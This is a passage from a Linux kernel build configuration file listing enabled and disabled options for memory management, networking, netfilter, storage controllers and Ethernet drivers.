CONFIG_QUEUED_RWLOCKS=y
CONFIG_ARCH_HAS_SYNC_CORE_BEFORE_USERMODE=y
CONFIG_ARCH_HAS_SYSCALL_WRAPPER=y
CONFIG_FREEZER=y

#
# Executable file formats
#
CONFIG_BINFMT_ELF=y
CONFIG_COMPAT_BINFMT_ELF=y
CONFIG_ELFCORE=y
CONFIG_CORE_DUMP_DEFAULT_ELF_HEADERS=y
CONFIG_BINFMT_SCRIPT=y
CONFIG_BINFMT_MISC=y
CONFIG_COREDUMP=y

#
# Memory Management options
#
CONFIG_SELECT_MEMORY_MODEL=y
CONFIG_SPARSEMEM_MANUAL=y
CONFIG_SPARSEMEM=y
CONFIG_NEED_MULTIPLE_NODES=y
CONFIG_HAVE_MEMORY_PRESENT=y
CONFIG_SPARSEMEM_EXTREME=y
CONFIG_SPARSEMEM_VMEMMAP_ENABLE=y
CONFIG_SPARSEMEM_VMEMMAP=y
CONFIG_HAVE_MEMBLOCK=y
CONFIG_HAVE_MEMBLOCK_NODE_MAP=y
CONFIG_ARCH_DISCARD_MEMBLOCK=y
# CONFIG_MEMORY_HOTPLUG is not set
CONFIG_SPLIT_PTLOCK_CPUS=4
CONFIG_COMPACTION=y
CONFIG_MIGRATION=y
CONFIG_PHYS_ADDR_T_64BIT=y
CONFIG_BOUNCE=y
CONFIG_VIRT_TO_BUS=y
CONFIG_MMU_NOTIFIER=y
# CONFIG_KSM is not set
CONFIG_DEFAULT_MMAP_MIN_ADDR=4096
CONFIG_ARCH_SUPPORTS_MEMORY_FAILURE=y
# CONFIG_MEMORY_FAILURE is not set
# CONFIG_TRANSPARENT_HUGEPAGE is not set
CONFIG_ARCH_WANTS_THP_SWAP=y
# CONFIG_CLEANCACHE is not set
# CONFIG_FRONTSWAP is not set
# CONFIG_CMA is not set
# CONFIG_ZPOOL is not set
# CONFIG_ZBUD is not set
# CONFIG_ZSMALLOC is not set
CONFIG_GENERIC_EARLY_IOREMAP=y
# CONFIG_DEFERRED_STRUCT_PAGE_INIT is not set
# CONFIG_IDLE_PAGE_TRACKING is not set
CONFIG_ARCH_HAS_ZONE_DEVICE=y
CONFIG_ARCH_USES_HIGH_VMA_FLAGS=y
CONFIG_ARCH_HAS_PKEYS=y
# CONFIG_PERCPU_STATS is not set
# CONFIG_GUP_BENCHMARK is not set
CONFIG_ARCH_HAS_PTE_SPECIAL=y
CONFIG_NET=y
CONFIG_NET_INGRESS=y

#
# Networking options
#
CONFIG_PACKET=y
# CONFIG_PACKET_DIAG is not set
CONFIG_UNIX=y
CONFIG_UNIX_SCM=y
# CONFIG_UNIX_DIAG is not set
# CONFIG_TLS is not set
CONFIG_XFRM=y
CONFIG_XFRM_ALGO=y
CONFIG_XFRM_USER=y
# CONFIG_XFRM_INTERFACE is not set
# CONFIG_XFRM_SUB_POLICY is not set
# CONFIG_XFRM_MIGRATE is not set
# CONFIG_XFRM_STATISTICS is not set
# CONFIG_NET_KEY is not set
CONFIG_INET=y
CONFIG_IP_MULTICAST=y
CONFIG_IP_ADVANCED_ROUTER=y
# CONFIG_IP_FIB_TRIE_STATS is not set
CONFIG_IP_MULTIPLE_TABLES=y
CONFIG_IP_ROUTE_MULTIPATH=y
CONFIG_IP_ROUTE_VERBOSE=y
CONFIG_IP_PNP=y
CONFIG_IP_PNP_DHCP=y
CONFIG_IP_PNP_BOOTP=y
CONFIG_IP_PNP_RARP=y
# CONFIG_NET_IPIP is not set
# CONFIG_NET_IPGRE_DEMUX is not set
CONFIG_NET_IP_TUNNEL=y
CONFIG_IP_MROUTE_COMMON=y
CONFIG_IP_MROUTE=y
# CONFIG_IP_MROUTE_MULTIPLE_TABLES is not set
CONFIG_IP_PIMSM_V1=y
CONFIG_IP_PIMSM_V2=y
CONFIG_SYN_COOKIES=y
# CONFIG_NET_FOU is not set
# CONFIG_NET_FOU_IP_TUNNELS is not set
# CONFIG_INET_AH is not set
# CONFIG_INET_ESP is not set
# CONFIG_INET_IPCOMP is not set
CONFIG_INET_TABLE_PERTURB_ORDER=16
CONFIG_INET_TUNNEL=y
# CONFIG_INET_XFRM_MODE_TRANSPORT is not set
# CONFIG_INET_XFRM_MODE_TUNNEL is not set
# CONFIG_INET_XFRM_MODE_BEET is not set
# CONFIG_INET_DIAG is not set
CONFIG_TCP_CONG_ADVANCED=y
# CONFIG_TCP_CONG_BIC is not set
CONFIG_TCP_CONG_CUBIC=y
# CONFIG_TCP_CONG_WESTWOOD is not set
# CONFIG_TCP_CONG_HTCP is not set
# CONFIG_TCP_CONG_HSTCP is not set
# CONFIG_TCP_CONG_HYBLA is not set
# CONFIG_TCP_CONG_VEGAS is not set
# CONFIG_TCP_CONG_NV is not set
# CONFIG_TCP_CONG_SCALABLE is not set
# CONFIG_TCP_CONG_LP is not set
# CONFIG_TCP_CONG_VENO is not set
# CONFIG_TCP_CONG_YEAH is not set
# CONFIG_TCP_CONG_ILLINOIS is not set
# CONFIG_TCP_CONG_DCTCP is not set
# CONFIG_TCP_CONG_CDG is not set
# CONFIG_TCP_CONG_BBR is not set
CONFIG_DEFAULT_CUBIC=y
# CONFIG_DEFAULT_RENO is not set
CONFIG_DEFAULT_TCP_CONG="cubic"
CONFIG_TCP_MD5SIG=y
CONFIG_IPV6=y
# CONFIG_IPV6_ROUTER_PREF is not set
# CONFIG_IPV6_OPTIMISTIC_DAD is not set
CONFIG_INET6_AH=y
CONFIG_INET6_ESP=y
# CONFIG_INET6_ESP_OFFLOAD is not set
# CONFIG_INET6_IPCOMP is not set
# CONFIG_IPV6_MIP6 is not set
# CONFIG_IPV6_ILA is not set
CONFIG_INET6_XFRM_MODE_TRANSPORT=y
CONFIG_INET6_XFRM_MODE_TUNNEL=y
CONFIG_INET6_XFRM_MODE_BEET=y
# CONFIG_INET6_XFRM_MODE_ROUTEOPTIMIZATION is not set
# CONFIG_IPV6_VTI is not set
CONFIG_IPV6_SIT=y
# CONFIG_IPV6_SIT_6RD is not set
CONFIG_IPV6_NDISC_NODETYPE=y
# CONFIG_IPV6_TUNNEL is not set
# CONFIG_IPV6_MULTIPLE_TABLES is not set
# CONFIG_IPV6_MROUTE is not set
# CONFIG_IPV6_SEG6_LWTUNNEL is not set
# CONFIG_IPV6_SEG6_HMAC is not set
CONFIG_NETLABEL=y
CONFIG_NETWORK_SECMARK=y
CONFIG_NET_PTP_CLASSIFY=y
# CONFIG_NETWORK_PHY_TIMESTAMPING is not set
CONFIG_NETFILTER=y
# CONFIG_NETFILTER_ADVANCED is not set

#
# Core Netfilter Configuration
#
CONFIG_NETFILTER_INGRESS=y
CONFIG_NETFILTER_NETLINK=y
CONFIG_NETFILTER_NETLINK_LOG=y
CONFIG_NF_CONNTRACK=y
CONFIG_NF_LOG_COMMON=m
# CONFIG_NF_LOG_NETDEV is not set
CONFIG_NF_CONNTRACK_SECMARK=y
# CONFIG_NF_CONNTRACK_PROCFS is not set
# CONFIG_NF_CONNTRACK_LABELS is not set
CONFIG_NF_CONNTRACK_FTP=y
CONFIG_NF_CONNTRACK_IRC=y
# CONFIG_NF_CONNTRACK_NETBIOS_NS is not set
CONFIG_NF_CONNTRACK_SIP=y
CONFIG_NF_CT_NETLINK=y
# CONFIG_NETFILTER_NETLINK_GLUE_CT is not set
CONFIG_NF_NAT=m
CONFIG_NF_NAT_NEEDED=y
CONFIG_NF_NAT_FTP=m
CONFIG_NF_NAT_IRC=m
CONFIG_NF_NAT_SIP=m
# CONFIG_NF_TABLES is not set
CONFIG_NETFILTER_XTABLES=y

#
# Xtables combined modules
#
CONFIG_NETFILTER_XT_MARK=m

#
# Xtables targets
#
CONFIG_NETFILTER_XT_TARGET_CONNSECMARK=y
CONFIG_NETFILTER_XT_TARGET_LOG=m
CONFIG_NETFILTER_XT_NAT=m
# CONFIG_NETFILTER_XT_TARGET_NETMAP is not set
CONFIG_NETFILTER_XT_TARGET_NFLOG=y
# CONFIG_NETFILTER_XT_TARGET_REDIRECT is not set
CONFIG_NETFILTER_XT_TARGET_SECMARK=y
CONFIG_NETFILTER_XT_TARGET_TCPMSS=y

#
# Xtables matches
#
CONFIG_NETFILTER_XT_MATCH_ADDRTYPE=m
CONFIG_NETFILTER_XT_MATCH_CONNTRACK=y
CONFIG_NETFILTER_XT_MATCH_POLICY=y
CONFIG_NETFILTER_XT_MATCH_STATE=y
# CONFIG_IP_SET is not set
# CONFIG_IP_VS is not set

#
# IP: Netfilter Configuration
#
CONFIG_NF_DEFRAG_IPV4=y
# CONFIG_NF_SOCKET_IPV4 is not set
# CONFIG_NF_TPROXY_IPV4 is not set
# CONFIG_NF_DUP_IPV4 is not set
CONFIG_NF_LOG_ARP=m
CONFIG_NF_LOG_IPV4=m
CONFIG_NF_REJECT_IPV4=y
CONFIG_NF_NAT_IPV4=m
CONFIG_NF_NAT_MASQUERADE_IPV4=y
CONFIG_IP_NF_IPTABLES=y
CONFIG_IP_NF_FILTER=y
CONFIG_IP_NF_TARGET_REJECT=y
CONFIG_IP_NF_NAT=m
CONFIG_IP_NF_TARGET_MASQUERADE=m
CONFIG_IP_NF_MANGLE=y
# CONFIG_IP_NF_RAW is not set

#
# IPv6: Netfilter Configuration
#
# CONFIG_NF_SOCKET_IPV6 is not set
# CONFIG_NF_TPROXY_IPV6 is not set
# CONFIG_NF_DUP_IPV6 is not set
CONFIG_NF_REJECT_IPV6=y
CONFIG_NF_LOG_IPV6=m
CONFIG_IP6_NF_IPTABLES=y
CONFIG_IP6_NF_MATCH_IPV6HEADER=y
CONFIG_IP6_NF_FILTER=y
CONFIG_IP6_NF_TARGET_REJECT=y
CONFIG_IP6_NF_MANGLE=y
# CONFIG_IP6_NF_RAW is not set
CONFIG_NF_DEFRAG_IPV6=y
# CONFIG_BPFILTER is not set
# CONFIG_IP_DCCP is not set
# CONFIG_IP_SCTP is not set
# CONFIG_RDS is not set
# CONFIG_TIPC is not set
# CONFIG_ATM is not set
# CONFIG_L2TP is not set
# CONFIG_BRIDGE is not set
CONFIG_HAVE_NET_DSA=y
# CONFIG_NET_DSA is not set
# CONFIG_VLAN_8021Q is not set
# CONFIG_LLC2 is not set
# CONFIG_ATALK is not set
# CONFIG_X25 is not set
# CONFIG_LAPB is not set
# CONFIG_PHONET is not set
# CONFIG_6LOWPAN is not set
# CONFIG_IEEE802154 is not set
CONFIG_NET_SCHED=y

#
# Queueing/Scheduling
#
# CONFIG_NET_SCH_HTB is not set
# CONFIG_NET_SCH_HFSC is not set
# CONFIG_NET_SCH_PRIO is not set
# CONFIG_NET_SCH_MULTIQ is not set
# CONFIG_NET_SCH_RED is not set
# CONFIG_NET_SCH_SFB is not set
# CONFIG_NET_SCH_SFQ is not set
# CONFIG_NET_SCH_TEQL is not set
# CONFIG_NET_SCH_TBF is not set
# CONFIG_NET_SCH_CBS is not set
# CONFIG_NET_SCH_ETF is not set
# CONFIG_NET_SCH_GRED is not set
# CONFIG_NET_SCH_NETEM is not set
# CONFIG_NET_SCH_DRR is not set
# CONFIG_NET_SCH_MQPRIO is not set
# CONFIG_NET_SCH_SKBPRIO is not set
# CONFIG_NET_SCH_CHOKE is not set
# CONFIG_NET_SCH_QFQ is not set
# CONFIG_NET_SCH_CODEL is not set
# CONFIG_NET_SCH_FQ_CODEL is not set
# CONFIG_NET_SCH_CAKE is not set
# CONFIG_NET_SCH_FQ is not set
# CONFIG_NET_SCH_HHF is not set
# CONFIG_NET_SCH_PIE is not set
# CONFIG_NET_SCH_INGRESS is not set
# CONFIG_NET_SCH_PLUG is not set
# CONFIG_NET_SCH_DEFAULT is not set

#
# Classification
#
CONFIG_NET_CLS=y
# CONFIG_NET_CLS_BASIC is not set
# CONFIG_NET_CLS_ROUTE4 is not set
# CONFIG_NET_CLS_FW is not set
# CONFIG_NET_CLS_U32 is not set
# CONFIG_NET_CLS_FLOW is not set
# CONFIG_NET_CLS_CGROUP is not set
# CONFIG_NET_CLS_BPF is not set
# CONFIG_NET_CLS_FLOWER is not set
# CONFIG_NET_CLS_MATCHALL is not set
CONFIG_NET_EMATCH=y
CONFIG_NET_EMATCH_STACK=32
# CONFIG_NET_EMATCH_CMP is not set
# CONFIG_NET_EMATCH_NBYTE is not set
# CONFIG_NET_EMATCH_U32 is not set
# CONFIG_NET_EMATCH_META is not set
# CONFIG_NET_EMATCH_TEXT is not set
# CONFIG_NET_EMATCH_IPT is not set
CONFIG_NET_CLS_ACT=y
# CONFIG_NET_ACT_POLICE is not set
# CONFIG_NET_ACT_GACT is not set
# CONFIG_NET_ACT_MIRRED is not set
# CONFIG_NET_ACT_SAMPLE is not set
# CONFIG_NET_ACT_IPT is not set
# CONFIG_NET_ACT_NAT is not set
# CONFIG_NET_ACT_PEDIT is not set
# CONFIG_NET_ACT_SIMP is not set
# CONFIG_NET_ACT_SKBEDIT is not set
# CONFIG_NET_ACT_CSUM is not set
# CONFIG_NET_ACT_VLAN is not set
# CONFIG_NET_ACT_BPF is not set
# CONFIG_NET_ACT_SKBMOD is not set
# CONFIG_NET_ACT_IFE is not set
# CONFIG_NET_ACT_TUNNEL_KEY is not set
CONFIG_NET_SCH_FIFO=y
# CONFIG_DCB is not set
CONFIG_DNS_RESOLVER=y
# CONFIG_BATMAN_ADV is not set
# CONFIG_OPENVSWITCH is not set
# CONFIG_VSOCKETS is not set
# CONFIG_NETLINK_DIAG is not set
# CONFIG_MPLS is not set
# CONFIG_NET_NSH is not set
# CONFIG_HSR is not set
# CONFIG_NET_SWITCHDEV is not set
# CONFIG_NET_L3_MASTER_DEV is not set
# CONFIG_NET_NCSI is not set
CONFIG_RPS=y
CONFIG_RFS_ACCEL=y
CONFIG_XPS=y
# CONFIG_CGROUP_NET_PRIO is not set
# CONFIG_CGROUP_NET_CLASSID is not set
CONFIG_NET_RX_BUSY_POLL=y
CONFIG_BQL=y
# CONFIG_BPF_JIT is not set
CONFIG_NET_FLOW_LIMIT=y

#
# Network testing
#
# CONFIG_NET_PKTGEN is not set
# CONFIG_NET_DROP_MONITOR is not set
CONFIG_HAMRADIO=y

#
# Packet Radio protocols
#
# CONFIG_AX25 is not set
# CONFIG_CAN is not set
# CONFIG_BT is not set
# CONFIG_AF_RXRPC is not set
# CONFIG_AF_KCM is not set
CONFIG_FIB_RULES=y
CONFIG_WIRELESS=y
CONFIG_CFG80211=y
# CONFIG_NL80211_TESTMODE is not set
# CONFIG_CFG80211_DEVELOPER_WARNINGS is not set
CONFIG_CFG80211_REQUIRE_SIGNED_REGDB=y
CONFIG_CFG80211_USE_KERNEL_REGDB_KEYS=y
CONFIG_CFG80211_DEFAULT_PS=y
# CONFIG_CFG80211_DEBUGFS is not set
CONFIG_CFG80211_CRDA_SUPPORT=y
# CONFIG_CFG80211_WEXT is not set
CONFIG_MAC80211=y
CONFIG_MAC80211_HAS_RC=y
CONFIG_MAC80211_RC_MINSTREL=y
CONFIG_MAC80211_RC_MINSTREL_HT=y
CONFIG_MAC80211_RC_DEFAULT_MINSTREL=y
CONFIG_MAC80211_RC_DEFAULT="minstrel_ht"
# CONFIG_MAC80211_MESH is not set
CONFIG_MAC80211_LEDS=y
# CONFIG_MAC80211_DEBUGFS is not set
# CONFIG_MAC80211_MESSAGE_TRACING is not set
# CONFIG_MAC80211_DEBUG_MENU is not set
CONFIG_MAC80211_STA_HASH_MAX_SIZE=0
# CONFIG_WIMAX is not set
CONFIG_RFKILL=y
CONFIG_RFKILL_LEDS=y
CONFIG_RFKILL_INPUT=y
# CONFIG_NET_9P is not set
# CONFIG_CAIF is not set
# CONFIG_CEPH_LIB is not set
# CONFIG_NFC is not set
# CONFIG_PSAMPLE is not set
# CONFIG_NET_IFE is not set
# CONFIG_LWTUNNEL is not set
CONFIG_DST_CACHE=y
CONFIG_GRO_CELLS=y
# CONFIG_NET_DEVLINK is not set
CONFIG_MAY_USE_DEVLINK=y
# CONFIG_FAILOVER is not set
CONFIG_HAVE_EBPF_JIT=y

#
# Device Drivers
#

#
# Generic Driver Options
#
CONFIG_UEVENT_HELPER=y
CONFIG_UEVENT_HELPER_PATH="/sbin/hotplug"
CONFIG_DEVTMPFS=y
CONFIG_DEVTMPFS_MOUNT=y
CONFIG_STANDALONE=y
CONFIG_PREVENT_FIRMWARE_BUILD=y

#
# Firmware loader
#
CONFIG_FW_LOADER=y
CONFIG_EXTRA_FIRMWARE=""
# CONFIG_FW_LOADER_USER_HELPER is not set
CONFIG_ALLOW_DEV_COREDUMP=y
# CONFIG_DEBUG_DRIVER is not set
CONFIG_DEBUG_DEVRES=y
# CONFIG_DEBUG_TEST_DRIVER_REMOVE is not set
# CONFIG_TEST_ASYNC_DRIVER_PROBE is not set
CONFIG_GENERIC_CPU_AUTOPROBE=y
CONFIG_GENERIC_CPU_VULNERABILITIES=y
CONFIG_REGMAP=y
CONFIG_REGMAP_I2C=y
CONFIG_DMA_SHARED_BUFFER=y
# CONFIG_DMA_FENCE_TRACE is not set

#
# Bus devices
#
CONFIG_CONNECTOR=y
CONFIG_PROC_EVENTS=y
# CONFIG_GNSS is not set
# CONFIG_MTD is not set
# CONFIG_OF is not set
CONFIG_ARCH_MIGHT_HAVE_PC_PARPORT=y
# CONFIG_PARPORT is not set
CONFIG_PNP=y
CONFIG_PNP_DEBUG_MESSAGES=y

#
# Protocols
#
CONFIG_PNPACPI=y
CONFIG_BLK_DEV=y
# CONFIG_BLK_DEV_NULL_BLK is not set
# CONFIG_BLK_DEV_FD is not set
CONFIG_CDROM=y
# CONFIG_BLK_DEV_PCIESSD_MTIP32XX is not set
# CONFIG_BLK_DEV_DAC960 is not set
# CONFIG_BLK_DEV_UMEM is not set
CONFIG_BLK_DEV_LOOP=y
CONFIG_BLK_DEV_LOOP_MIN_COUNT=8
# CONFIG_BLK_DEV_CRYPTOLOOP is not set
# CONFIG_BLK_DEV_DRBD is not set
# CONFIG_BLK_DEV_NBD is not set
# CONFIG_BLK_DEV_SKD is not set
# CONFIG_BLK_DEV_RAM is not set
# CONFIG_CDROM_PKTCDVD is not set
# CONFIG_ATA_OVER_ETH is not set
# CONFIG_BLK_DEV_RBD is not set
# CONFIG_BLK_DEV_RSXX is not set

#
# NVME Support
#
# CONFIG_BLK_DEV_NVME is not set
# CONFIG_NVME_FC is not set

#
# Misc devices
#
# CONFIG_AD525X_DPOT is not set
# CONFIG_DUMMY_IRQ is not set
# CONFIG_IBM_ASM is not set
# CONFIG_PHANTOM is not set
# CONFIG_SGI_IOC4 is not set
# CONFIG_TIFM_CORE is not set
# CONFIG_ICS932S401 is not set
# CONFIG_ENCLOSURE_SERVICES is not set
# CONFIG_HP_ILO is not set
# CONFIG_APDS9802ALS is not set
# CONFIG_ISL29003 is not set
# CONFIG_ISL29020 is not set
# CONFIG_SENSORS_TSL2550 is not set
# CONFIG_SENSORS_BH1770 is not set
# CONFIG_SENSORS_APDS990X is not set
# CONFIG_HMC6352 is not set
# CONFIG_DS1682 is not set
# CONFIG_USB_SWITCH_FSA9480 is not set
# CONFIG_SRAM is not set
# CONFIG_PCI_ENDPOINT_TEST is not set
# CONFIG_C2PORT is not set

#
# EEPROM support
#
# CONFIG_EEPROM_AT24 is not set
# CONFIG_EEPROM_LEGACY is not set
# CONFIG_EEPROM_MAX6875 is not set
# CONFIG_EEPROM_93CX6 is not set
# CONFIG_EEPROM_IDT_89HPESX is not set
# CONFIG_CB710_CORE is not set

#
# Texas Instruments shared transport line discipline
#
# CONFIG_SENSORS_LIS3_I2C is not set
# CONFIG_ALTERA_STAPL is not set
# CONFIG_INTEL_MEI is not set
# CONFIG_INTEL_MEI_ME is not set
# CONFIG_INTEL_MEI_TXE is not set
# CONFIG_VMWARE_VMCI is not set

#
# Intel MIC & related support
#

#
# Intel MIC Bus Driver
#
# CONFIG_INTEL_MIC_BUS is not set

#
# SCIF Bus Driver
#
# CONFIG_SCIF_BUS is not set

#
# VOP Bus Driver
#
# CONFIG_VOP_BUS is not set

#
# Intel MIC Host Driver
#

#
# Intel MIC Card Driver
#

#
# SCIF Driver
#

#
# Intel MIC Coprocessor State Management (COSM) Drivers
#

#
# VOP Driver
#
# CONFIG_GENWQE is not set
# CONFIG_ECHO is not set
# CONFIG_MISC_RTSX_PCI is not set
# CONFIG_MISC_RTSX_USB is not set
CONFIG_HAVE_IDE=y
# CONFIG_IDE is not set

#
# SCSI device support
#
CONFIG_SCSI_MOD=y
# CONFIG_RAID_ATTRS is not set
CONFIG_SCSI=y
CONFIG_SCSI_DMA=y
CONFIG_SCSI_MQ_DEFAULT=y
CONFIG_SCSI_PROC_FS=y

#
# SCSI support type (disk, tape, CD-ROM)
#
CONFIG_BLK_DEV_SD=y
# CONFIG_CHR_DEV_ST is not set
# CONFIG_CHR_DEV_OSST is not set
CONFIG_BLK_DEV_SR=y
CONFIG_CHR_DEV_SG=y
# CONFIG_CHR_DEV_SCH is not set
CONFIG_SCSI_CONSTANTS=y
# CONFIG_SCSI_LOGGING is not set
# CONFIG_SCSI_SCAN_ASYNC is not set

#
# SCSI Transports
#
CONFIG_SCSI_SPI_ATTRS=y
# CONFIG_SCSI_FC_ATTRS is not set
# CONFIG_SCSI_ISCSI_ATTRS is not set
# CONFIG_SCSI_SAS_ATTRS is not set
# CONFIG_SCSI_SAS_LIBSAS is not set
# CONFIG_SCSI_SRP_ATTRS is not set
# CONFIG_SCSI_LOWLEVEL is not set
# CONFIG_SCSI_LOWLEVEL_PCMCIA is not set
# CONFIG_SCSI_DH is not set
# CONFIG_SCSI_OSD_INITIATOR is not set
CONFIG_ATA=y
CONFIG_ATA_VERBOSE_ERROR=y
CONFIG_ATA_ACPI=y
# CONFIG_SATA_ZPODD is not set
CONFIG_SATA_PMP=y

#
# Controllers with non-SFF native interface
#
CONFIG_SATA_AHCI=y
CONFIG_SATA_MOBILE_LPM_POLICY=0
# CONFIG_SATA_AHCI_PLATFORM is not set
# CONFIG_SATA_INIC162X is not set
# CONFIG_SATA_ACARD_AHCI is not set
# CONFIG_SATA_SIL24 is not set
CONFIG_ATA_SFF=y

#
# SFF controllers with custom DMA interface
#
# CONFIG_PDC_ADMA is not set
# CONFIG_SATA_QSTOR is not set
# CONFIG_SATA_SX4 is not set
CONFIG_ATA_BMDMA=y

#
# SATA SFF controllers with BMDMA
#
CONFIG_ATA_PIIX=y
# CONFIG_SATA_DWC is not set
# CONFIG_SATA_MV is not set
# CONFIG_SATA_NV is not set
# CONFIG_SATA_PROMISE is not set
# CONFIG_SATA_SIL is not set
# CONFIG_SATA_SIS is not set
# CONFIG_SATA_SVW is not set
# CONFIG_SATA_ULI is not set
# CONFIG_SATA_VIA is not set
# CONFIG_SATA_VITESSE is not set

#
# PATA SFF controllers with BMDMA
#
# CONFIG_PATA_ALI is not set
CONFIG_PATA_AMD=y
# CONFIG_PATA_ARTOP is not set
# CONFIG_PATA_ATIIXP is not set
# CONFIG_PATA_ATP867X is not set
# CONFIG_PATA_CMD64X is not set
# CONFIG_PATA_CYPRESS is not set
# CONFIG_PATA_EFAR is not set
# CONFIG_PATA_HPT366 is not set
# CONFIG_PATA_HPT37X is not set
# CONFIG_PATA_HPT3X2N is not set
# CONFIG_PATA_HPT3X3 is not set
# CONFIG_PATA_IT8213 is not set
# CONFIG_PATA_IT821X is not set
# CONFIG_PATA_JMICRON is not set
# CONFIG_PATA_MARVELL is not set
# CONFIG_PATA_NETCELL is not set
# CONFIG_PATA_NINJA32 is not set
# CONFIG_PATA_NS87415 is not set
CONFIG_PATA_OLDPIIX=y
# CONFIG_PATA_OPTIDMA is not set
# CONFIG_PATA_PDC2027X is not set
# CONFIG_PATA_PDC_OLD is not set
# CONFIG_PATA_RADISYS is not set
# CONFIG_PATA_RDC is not set
CONFIG_PATA_SCH=y
# CONFIG_PATA_SERVERWORKS is not set
# CONFIG_PATA_SIL680 is not set
# CONFIG_PATA_SIS is not set
# CONFIG_PATA_TOSHIBA is not set
# CONFIG_PATA_TRIFLEX is not set
# CONFIG_PATA_VIA is not set
# CONFIG_PATA_WINBOND is not set

#
# PIO-only SFF controllers
#
# CONFIG_PATA_CMD640_PCI is not set
# CONFIG_PATA_MPIIX is not set
# CONFIG_PATA_NS87410 is not set
# CONFIG_PATA_OPTI is not set
# CONFIG_PATA_PCMCIA is not set
# CONFIG_PATA_RZ1000 is not set

#
# Generic fallback / legacy drivers
#
# CONFIG_PATA_ACPI is not set
# CONFIG_ATA_GENERIC is not set
# CONFIG_PATA_LEGACY is not set
CONFIG_MD=y
CONFIG_BLK_DEV_MD=y
CONFIG_MD_AUTODETECT=y
# CONFIG_MD_LINEAR is not set
# CONFIG_MD_RAID0 is not set
# CONFIG_MD_RAID1 is not set
# CONFIG_MD_RAID10 is not set
# CONFIG_MD_RAID456 is not set
# CONFIG_MD_MULTIPATH is not set
# CONFIG_MD_FAULTY is not set
# CONFIG_BCACHE is not set
CONFIG_BLK_DEV_DM_BUILTIN=y
CONFIG_BLK_DEV_DM=y
# CONFIG_DM_MQ_DEFAULT is not set
# CONFIG_DM_DEBUG is not set
# CONFIG_DM_UNSTRIPED is not set
# CONFIG_DM_CRYPT is not set
# CONFIG_DM_SNAPSHOT is not set
# CONFIG_DM_THIN_PROVISIONING is not set
# CONFIG_DM_CACHE is not set
# CONFIG_DM_WRITECACHE is not set
# CONFIG_DM_ERA is not set
CONFIG_DM_MIRROR=y
# CONFIG_DM_LOG_USERSPACE is not set
# CONFIG_DM_RAID is not set
CONFIG_DM_ZERO=y
# CONFIG_DM_MULTIPATH is not set
# CONFIG_DM_DELAY is not set
# CONFIG_DM_UEVENT is not set
# CONFIG_DM_FLAKEY is not set
# CONFIG_DM_VERITY is not set
# CONFIG_DM_SWITCH is not set
# CONFIG_DM_LOG_WRITES is not set
# CONFIG_DM_INTEGRITY is not set
# CONFIG_TARGET_CORE is not set
# CONFIG_FUSION is not set

#
# IEEE 1394 (FireWire) support
#
# CONFIG_FIREWIRE is not set
# CONFIG_FIREWIRE_NOSY is not set
CONFIG_MACINTOSH_DRIVERS=y
CONFIG_MAC_EMUMOUSEBTN=y
CONFIG_NETDEVICES=y
CONFIG_MII=y
CONFIG_NET_CORE=y
# CONFIG_BONDING is not set
# CONFIG_DUMMY is not set
# CONFIG_EQUALIZER is not set
# CONFIG_NET_FC is not set
# CONFIG_IFB is not set
# CONFIG_NET_TEAM is not set
# CONFIG_MACVLAN is not set
# CONFIG_IPVLAN is not set
# CONFIG_VXLAN is not set
# CONFIG_GENEVE is not set
# CONFIG_GTP is not set
# CONFIG_MACSEC is not set
CONFIG_NETCONSOLE=y
CONFIG_NETPOLL=y
CONFIG_NET_POLL_CONTROLLER=y
# CONFIG_TUN is not set
# CONFIG_TUN_VNET_CROSS_LE is not set
# CONFIG_VETH is not set
# CONFIG_NLMON is not set
# CONFIG_ARCNET is not set

#
# CAIF transport drivers
#

#
# Distributed Switch Architecture drivers
#
CONFIG_ETHERNET=y
CONFIG_NET_VENDOR_3COM=y
# CONFIG_PCMCIA_3C574 is not set
# CONFIG_PCMCIA_3C589 is not set
# CONFIG_VORTEX is not set
# CONFIG_TYPHOON is not set
CONFIG_NET_VENDOR_ADAPTEC=y
# CONFIG_ADAPTEC_STARFIRE is not set
CONFIG_NET_VENDOR_AGERE=y
# CONFIG_ET131X is not set
CONFIG_NET_VENDOR_ALACRITECH=y
# CONFIG_SLICOSS is not set
CONFIG_NET_VENDOR_ALTEON=y
# CONFIG_ACENIC is not set
# CONFIG_ALTERA_TSE is not set
CONFIG_NET_VENDOR_AMAZON=y
# CONFIG_ENA_ETHERNET is not set
CONFIG_NET_VENDOR_AMD=y
# CONFIG_AMD8111_ETH is not set
# CONFIG_PCNET32 is not set
# CONFIG_PCMCIA_NMCLAN is not set
# CONFIG_AMD_XGBE is not set
CONFIG_NET_VENDOR_AQUANTIA=y
# CONFIG_AQTION is not set
CONFIG_NET_VENDOR_ARC=y
CONFIG_NET_VENDOR_ATHEROS=y
# CONFIG_ATL2 is not set
# CONFIG_ATL1 is not set
# CONFIG_ATL1E is not set
# CONFIG_ATL1C is not set
# CONFIG_ALX is not set
CONFIG_NET_VENDOR_AURORA=y
# CONFIG_AURORA_NB8800 is not set
CONFIG_NET_VENDOR_BROADCOM=y
# CONFIG_B44 is not set
# CONFIG_BCMGENET is not set
# CONFIG_BNX2 is not set
# CONFIG_CNIC is not set
CONFIG_TIGON3=y
CONFIG_TIGON3_HWMON=y
# CONFIG_BNX2X is not set
# CONFIG_SYSTEMPORT is not set
# CONFIG_BNXT is not set
CONFIG_NET_VENDOR_BROCADE=y
# CONFIG_BNA is not set
CONFIG_NET_VENDOR_CADENCE=y
# CONFIG_MACB is not set
CONFIG_NET_VENDOR_CAVIUM=y
# CONFIG_THUNDER_NIC_PF is not set
# CONFIG_THUNDER_NIC_VF is not set
# CONFIG_THUNDER_NIC_BGX is not set
# CONFIG_THUNDER_NIC_RGX is not set
CONFIG_CAVIUM_PTP=y
# CONFIG_LIQUIDIO is not set
# CONFIG_LIQUIDIO_VF is not set
CONFIG_NET_VENDOR_CHELSIO=y
# CONFIG_CHELSIO_T1 is not set
# CONFIG_CHELSIO_T3 is not set
# CONFIG_CHELSIO_T4 is not set
# CONFIG_CHELSIO_T4VF is not set
CONFIG_NET_VENDOR_CISCO=y
# CONFIG_ENIC is not set
CONFIG_NET_VENDOR_CORTINA=y
# CONFIG_CX_ECAT is not set
# CONFIG_DNET is not set
CONFIG_NET_VENDOR_DEC=y
CONFIG_NET_TULIP=y
# CONFIG_DE2104X is not set
# CONFIG_TULIP is not set
# CONFIG_DE4X5 is not set
# CONFIG_WINBOND_840 is not set
# CONFIG_DM9102 is not set
# CONFIG_ULI526X is not set
# CONFIG_PCMCIA_XIRCOM is not set
CONFIG_NET_VENDOR_DLINK=y
# CONFIG_DL2K is not set
# CONFIG_SUNDANCE is not set
